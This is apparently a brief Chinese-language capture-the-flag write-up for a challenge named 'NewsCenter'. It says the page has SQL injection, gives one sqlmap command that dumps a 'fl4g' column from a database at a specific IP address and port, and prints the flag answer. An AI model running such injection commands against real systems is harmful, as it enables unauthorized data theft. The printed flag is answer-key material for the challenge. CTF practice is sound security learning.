# NewsCenter

> sql注入,sqlmap一把梭获取所有数据

## 思路分析

> sql注入

## payload

> sqlmap -u http://61.147.171.105:59284 --data "search=df" -D news -T secret_table -C "fl4g" --dump

## flag

> QCTF{sq1_inJec7ion_ezzz}